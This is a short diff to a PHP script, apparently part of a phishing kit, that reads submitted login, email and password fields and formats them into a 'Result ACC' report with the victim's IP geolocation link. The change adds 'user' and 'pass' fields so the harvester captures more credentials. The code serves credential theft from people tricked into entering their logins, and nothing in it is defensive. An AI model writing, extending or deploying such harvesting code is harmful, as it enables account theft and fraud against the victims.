@@ -10,14 +10,16 @@ $useragent = $_SERVER['HTTP_USER_AGENT'];
 $email = $_POST['email'];
 $password = $_POST['password'];
 $login = $_POST['login'];
+$user = $_POST['user'];
+$pass = $_POST['pass'];
 
 $msg = ("
 ❗️=========== Result ACC ===========❗️
 
 
 [Login] = ".$login."
-PUNYA SI  = ".$email."
-PASSWORD  = ".$password."
+PUNYA SI  = ".$email."".$user."
+PASSWORD  = ".$password."".$pass."
 
 😳😳😳😳😳😳😳😳😳😳😳😳😳😳😳😳😳😳
 [IP INFO] = http://www.geoiptool.com/?IP=".$IP."
